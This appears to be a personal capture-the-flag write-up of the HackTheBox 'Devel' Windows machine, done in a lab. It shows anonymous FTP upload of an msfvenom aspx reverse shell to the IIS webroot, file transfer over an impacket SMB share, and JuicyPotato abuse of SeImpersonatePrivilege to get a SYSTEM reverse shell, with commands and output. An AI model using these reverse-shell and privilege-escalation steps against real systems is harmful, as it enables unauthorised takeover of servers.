Devel is an easy windows box from HackTheBox. It is an old box so there was not much to enumerate nor was it very difficult at all. In fact, this is one of the shortest boxes I have ever done. Regardless of the length of the box, it did teach me how to abuse SE Impersonate which proved to be a crucial skill for me later on.

Looks like we have ftp with anonymous logon an a website. Let's take a look at the website first.


    
![](https://i.imgur.com/FXLcq81.png)



Okay so the website is a default IIS page, in other words, its useless. Let's look elsewhere. Let's revisit the FTP service that the machine was running.

`ftp 10.10.10.5`
```
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.

230 User logged in.

03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```
Judging by the files in here, it looks like this is the webroot. Let's see what happens when we visit one of these pages. For starters, I tried the welcome.png file.



![](https://i.imgur.com/TKwqutn.png)
    


## Foothold
Look at that, the files within the webroot can be visited on the site just by viewing as if it was a directory. Since we now now that this is the webroot and that this is running asp.NET, an aspx webshell may potentially get us a shell if we visit the file like we did with the image.
`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx`
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2742 bytes
```

This command crafts a reverse shell payload using msfvenom.

`ftp 10.10.10.5`
```
ftp 10.10.10.5

```

> Note that before uploading the webshell, we need to set the mode to binary to tranfer binary data rather than the default, ascii. If we let it keep the default, it will corrupt the payload and it will fail to run upon visiting it on the site. 
{: .prompt-warning }

Now that thats done, set up the listener.

`rlwrap nc -nvlp 4444`

> I use rlwrap since it makes the janky shell much more tolerable. 
{: .prompt-tip }


Now that it is set up, when we visit the shell that we uploaded on the site, we should recieve a shell as the webserver back on our listener. Let's see if it worked.

Blank page, well its to be expected, its just going to run our payload. Let's look at our listener.

```

c:\windows\system32\inetsrv>
```
Boom! Look at that, it worked perfectly! 

## Privesc
So I've learned in previous workshops and from listening to Lawrence and Evan with a healthy dose of a strong reminder from Dylan, webshells are especially dangerous on windows machines because of one major built in flaw.

`whoami /all`

```

Okay that is a lot of text but look here at the most important part:

> SeImpersonatePrivilege        Impersonate a client after authentication Enabled
{: .prompt-danger }

SeImpersonate is enabled. With this we can use a notorious but delicious vegetable to raise our privileges. Let's deploy the JuicyPotato. But before we even do that, how do we upload files to the machine? Let's pretend that I knew that FTP was running but wanted to demonstrate a different but more complicated way. Unlike linux machines where we can just setup http servers with python3 and using wget, we could instead use smb! Here's how we set it up.

We can use impacket to setup an smb server. The arguments are as follows:

> `impacket-smbserver [Share Name] [Directory] -smb2support`
{: .prompt-info }

So in our case for Devel, it should look like this for our current directory as the share:

`impacket-smbserver lmao .  -smb2support`

The "-smb2support" is necessary to for our machine to transer files so just use it.

Now that the share is setup, we can grab the potato that we downloaded to our current directory.

`cd \windows\temp`

But before that, lets make sure that we are in a directory that we have write permissions. That being the tmp, but note that for windows systems, its called 'temp'.

In order to download from the share we created, we need to do this:

`copy \\[Host IP]\[Share Name]\[File]`

> This is called Universal Naming Convention or UNC. You'll recognize it by the backslashes. So for our case with the potato:
{: .prompt-info }

`copy \\10.10.14.19\lmao\Juicy.Potato.x86.exe`
Next we just upload yet another msfvenom reverse shell payload. Then to run this tool we just call it and check our listener:

```
Juicy.Potato.x86.exe -t * -p c:\Windows\Temp\thisHasToWork.exe  -l 4445 -c "{69AD4AEE-51BE-439b-A92C-86AE490E8B30}"
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 4445        
......                                                     
[+] authresult 0

[+] CreateProcessWithTokenW OK
```

And as for our listener..

```                                                                   
listening on [any] 4444 ...                                                                                                                                                                                                                 
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.5] 49233

```
There we go! We have the system. The SE impersonate with that CLSID we specified allowed us to impersonate the system.

And for the final step,
```
whoami
nt authority\system

## Review
### FTP basics
Well not necessarily basics, but some key things I took away while using FTP in this box. This is the second time, first being during Lame or Legacy, that I saw anonymous logon with FTP. To log in anonymously, just follow this: 
`ftp [ip]`
```
Connected to [IP].
220 Microsoft FTP Service
Name ([IP]:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```
When prompted for a username, put in anonymous and as for the password, you can type practically anything and it will accept you in.

To get a file or upload a file, you would use the get or put commands respectively.

```
ftp> get [File]
## Or
ftp> put [File]
```
Note that when getting a file, you should be in the directory that you wanted to get. I have not tested if you can specify file paths so I can't say for sure. Same thing with put.

One important thing to note with put is that if you don't set your mode to binary, payloads may become corrupted. To prevent this type in:

```
ftp> bin
200 Type set to I.
```

This way you now tranfer data in binary rather than ascii, the default.

### Universal Naming Convention
Or UNC for short, is a way of calling files. This comes in handy especially for Windows machines. All you have to do is:
```bash=
command \\[IP]\[Share]\[File]
```
Double slash before the machine you want to connect to followed by a single slash for the share name. That's all.
### Juicy Potato
Download link: 
https://github.com/ivanitlearning/Juicy-Potato-x86

Juicy Potato is quite complicated, don't try to understand how it works. It just does. Rather than trying to understand how it works, lets learn how to deploy it. This is the help page:
```
$ Juicy.Potato.x86.exe                                       
JuicyPotato v0.1  

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port

Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```
And a template to follow to use it:
```
Juicy.Potato.x86.exe -t * -p [Program] -l [NC listener port] -c [CLSID]
```
Typically, or well atleast in the case of Devel, you would want to set the program to be a reverse shell. And as for CLSID, well these are specific ids. Think of them as a SSN for processes. Pretty much we should select a CLSID that would impersonate something that would run as system to get system level priviliges. This can change depending on the OS of what we are using so we need to inventory that.
Sample output from Devel:
```
systeminfo                                                             
Host Name:                 DEVEL                           
OS Name:                   Microsoft Windows 7 Enterprise                     
OS Version:                6.1.7600 N/A Build 7600
```
So in the case we need a CLSID for a Windows 7 machine. 
Heres a list of CLSID for Windows 7: 
https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/

All it takes is a quick google search for these CLSIDs.

### Msfvenom
Its late that I'm finally using this tool but better late than ever. So far from what I've seen, its a really powerful tool to make payloads. Heres the bible: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
This sheet has many reverse shell payloads for many different OS. In the case for Devel, we needed x86 payloads. Here is the code snippet for what I ran on Devel when I called Juicy Potato.
```
┌──(root㉿kali)-[/home/kali/Documents/Devel]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > lmao.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
